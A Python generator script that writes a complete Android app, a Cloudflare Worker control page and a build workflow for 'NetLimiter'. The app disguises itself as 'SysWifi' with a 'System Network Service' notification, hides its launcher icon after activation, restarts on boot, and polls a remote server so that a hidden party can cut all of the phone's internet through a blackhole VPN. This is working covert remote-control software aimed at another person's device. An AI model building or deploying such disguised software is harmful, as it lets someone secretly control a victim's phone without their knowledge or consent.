import os
import subprocess
import sys

# 项目配置
PACKAGE_NAME = "com.example.netlimiter"
PACKAGE_DIR = PACKAGE_NAME.replace(".", "/")
PROJECT_NAME = "NetLimiter"

# 文件内容模板
FILES = {}

# 1. 项目级 build.gradle
FILES["build.gradle.kts"] = """
plugins {
    id("com.android.application") version "8.1.0" apply false
    id("org.jetbrains.kotlin.android") version "1.9.0" apply false
}
"""

# 2. settings.gradle.kts
FILES["settings.gradle.kts"] = f"""
pluginManagement {{
    repositories {{
        google()
        mavenCentral()
        gradlePluginPortal()
    }}
}}
dependencyResolutionManagement {{
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {{
        google()
        mavenCentral()
    }}
}}
rootProject.name = "{PROJECT_NAME}"
include(":app")
"""

# 3. App级 build.gradle
FILES["app/build.gradle.kts"] = f"""
plugins {{
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}}

android {{
    namespace = "{PACKAGE_NAME}"
    compileSdk = 34

    defaultConfig {{
        applicationId = "{PACKAGE_NAME}"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }}

    buildTypes {{
        release {{
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }}
    }}
    compileOptions {{
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }}
    kotlinOptions {{
        jvmTarget = "1.8"
    }}
}}

dependencies {{
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("com.squareup.okhttp3:okhttp:4.11.0")
}}
"""

# 4. AndroidManifest.xml
FILES["app/src/main/AndroidManifest.xml"] = f"""
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".LimitVpnService"
            android:permission="android.permission.BIND_VPN_SERVICE"
            android:exported="false"
            android:foregroundServiceType="specialUse">
            <intent-filter>
                <action android:name="android.net.VpnService" />
            </intent-filter>
        </service>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
"""

# 5. MainActivity.kt
FILES[f"app/src/main/java/{PACKAGE_DIR}/MainActivity.kt"] = f"""
package {PACKAGE_NAME}

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.VpnService
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import android.view.Gravity
import android.widget.LinearLayout

class MainActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        
        val layout = LinearLayout(this)
        layout.gravity = Gravity.CENTER
        val btn = Button(this)
        btn.text = "Activate & Hide Icon"
        btn.setOnClickListener {{ checkAndStart() }}
        layout.addView(btn)
        setContentView(layout)
    }}

    private fun checkAndStart() {{
        val intent = VpnService.prepare(this)
        if (intent != null) {{
            startActivityForResult(intent, 0)
        }} else {{
            onActivityResult(0, RESULT_OK, null)
        }}
    }}

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {{
        if (resultCode == RESULT_OK) {{
            val intent = Intent(this, LimitVpnService::class.java)
            startForegroundService(intent)

            val p = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            Toast.makeText(this, "Service Started. Icon Hidden.", Toast.LENGTH_LONG).show()
            finish()
        }}
    }}
}}
"""

# 6. LimitVpnService.kt
FILES[f"app/src/main/java/{PACKAGE_DIR}/LimitVpnService.kt"] = f"""
package {PACKAGE_NAME}

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.net.VpnService
import android.os.Build
import android.os.ParcelFileDescriptor
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

class LimitVpnService : VpnService() {{

    private var interfaceParams: ParcelFileDescriptor? = null
    private var isRunning = false
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .build()

    // TODO: 部署完Worker后，请务必修改这里的URL！
    private val CONTROL_URL = "https://REPLACE_WITH_YOUR_WORKER_URL/api/check"

    override fun onCreate() {{
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification("System Network Service"))
    }}

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {{
        if (!isRunning) {{
            isRunning = true
            startControlLoop()
        }}
        return START_STICKY
    }}

    override fun onDestroy() {{
        isRunning = false
        stopVpn()
        super.onDestroy()
    }}

    private fun startControlLoop() {{
        thread {{
            while (isRunning) {{
                try {{
                    if (CONTROL_URL.contains("REPLACE")) {{
                        Log.e("VPN", "URL not set! Please modify source code.")
                        Thread.sleep(5000)
                        continue
                    }}
                    
                    val request = Request.Builder().url(CONTROL_URL).build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string()
                    val shouldLimit = body?.contains("\\"limited\\":true") == true

                    if (shouldLimit && interfaceParams == null) {{
                        startVpnBlock()
                    }} else if (!shouldLimit && interfaceParams != null) {{
                        stopVpn()
                    }}
                    Thread.sleep(10000) 
                }} catch (e: Exception) {{
                    e.printStackTrace()
                    Thread.sleep(20000)
                }}
            }}
        }}
    }}

    private fun startVpnBlock() {{
        try {{
            val builder = Builder()
            builder.setSession("NetLimiter")
            builder.addAddress("10.0.0.2", 24)
            builder.addRoute("0.0.0.0", 0)
            builder.addDisallowedApplication(packageName)
            interfaceParams = builder.establish()
        }} catch (e: Exception) {{ e.printStackTrace() }}
    }}

    private fun stopVpn() {{
        try {{
            interfaceParams?.close()
            interfaceParams = null
        }} catch (e: Exception) {{ e.printStackTrace() }}
    }}

    private fun createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            val channel = NotificationChannel("srv", "System", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }}
    }}

    private fun createNotification(text: String): Notification {{
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "srv") else Notification.Builder(this)
        return builder.setContentTitle("System").setContentText(text).setSmallIcon(android.R.drawable.stat_sys_download).build()
    }}
}}
"""

# 7. BootReceiver.kt
FILES[f"app/src/main/java/{PACKAGE_DIR}/BootReceiver.kt"] = f"""
package {PACKAGE_NAME}
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
class BootReceiver : BroadcastReceiver() {{
    override fun onReceive(context: Context, intent: Intent) {{
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {{
            val serviceIntent = Intent(context, LimitVpnService::class.java)
            context.startForegroundService(serviceIntent)
        }}
    }}
}}
"""

# 8. GitHub Actions Workflow
FILES[".github/workflows/android.yml"] = """
name: Android CI
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: set up JDK 17
      uses: actions/setup-java@v3
      with:
        java-version: '17'
        distribution: 'temurin'
    - name: Setup Gradle
      uses: gradle/gradle-build-action@v2
    - name: Build with Gradle
      run: ./gradlew assembleDebug
    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: app-debug
        path: app/build/outputs/apk/debug/app-debug.apk
"""

# 9. Server Worker (Backup)
FILES["server/worker.js"] = """
// 部署到 Cloudflare Worker
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const key = "NET_LIMIT_STATUS";
    if (request.method === "POST" && url.pathname === "/api/set") {
      const body = await request.json();
      await env.APP_CONFIG.put(key, body.status ? "1" : "0");
      return new Response(JSON.stringify({ success: true, status: body.status }));
    }
    if (request.method === "GET" && url.pathname === "/api/check") {
      const val = await env.APP_CONFIG.get(key);
      return new Response(JSON.stringify({ limited: val === "1" }));
    }
    const currentStatus = await env.APP_CONFIG.get(key) === "1";
    const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:sans-serif;text-align:center;padding:50px}.btn{padding:20px 40px;font-size:24px;border:none;border-radius:10px;cursor:pointer;color:white}.red{background-color:#e74c3c}.green{background-color:#2ecc71}</style></head><body><h1>Net Control</h1><h2>${currentStatus?"🔴 LIMITED":"🟢 NORMAL"}</h2><button class="btn red" onclick="s(true)">Limit</button> <button class="btn green" onclick="s(false)">Unlock</button><script>async function s(l){await fetch('/api/set',{method:'POST',body:JSON.stringify({status:l})});location.reload()}</script></body></html>`;
    return new Response(html, { headers: { 'Content-Type': 'text/html;charset=UTF-8' } });
  }
};
"""

# 10. Res files
FILES["app/src/main/res/values/strings.xml"] = f"""<resources><string name="app_name">SysWifi</string></resources>"""
FILES["app/src/main/res/values/colors.xml"] = """<resources><color name="black">#FF000000</color><color name="white">#FFFFFFFF</color></resources>"""
FILES["app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml"] = """<?xml version="1.0" encoding="utf-8"?><adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android"><background android:drawable="@android:color/darker_gray"/><foreground android:drawable="@android:drawable/ic_menu_rotate"/></adaptive-icon>"""

# 11. Gitignore
FILES[".gitignore"] = """
*.iml
.gradle
/local.properties
/.idea/
.DS_Store
/build
/captures
.externalNativeBuild
.cxx
local.properties
"""

def create_structure():
    print("🚀 开始生成 Android 项目结构...")
    for path, content in FILES.items():
        # 确保目录存在
        dir_name = os.path.dirname(path)
        if dir_name and not os.path.exists(dir_name):
            os.makedirs(dir_name)
        
        # 写入文件
        with open(path, "w", encoding="utf-8") as f:
            f.write(content.strip())
        print(f"✅ Created: {path}")

    # 生成 proguard (空)
    with open("app/proguard-rules.pro", "w") as f:
        f.write("# Rules")

    print("\n📦 初始化 Gradle Wrapper (这可能需要几秒钟)...")
    try:
        # 尝试使用系统安装的 gradle 生成 wrapper
        subprocess.run(["gradle", "wrapper"], check=True)
        # 赋予执行权限
        if os.path.exists("gradlew"):
            subprocess.run(["chmod", "+x", "gradlew"], check=True)
        print("✅ Gradle Wrapper 初始化完成")
    except Exception as e:
        print(f"⚠️ 无法自动初始化 Gradle Wrapper: {e}")
        print("不用担心，GitHub Actions 会自动处理。")

    print("\n🎉 项目生成完毕！")
    print("-----------------------------------------------------")
    print("⚠️  下一步操作：")
    print(f"1. 打开文件: app/src/main/java/{PACKAGE_DIR}/LimitVpnService.kt")
    print("2. 找到 'REPLACE_WITH_YOUR_WORKER_URL'")
    print("3. 替换为你自己的 Cloudflare Worker 地址")
    print("4. 提交代码到 GitHub:")
    print("   git add .")
    print("   git commit -m 'Initial commit'")
    print("   git push")
    print("-----------------------------------------------------")

if __name__ == "__main__":
    create_structure()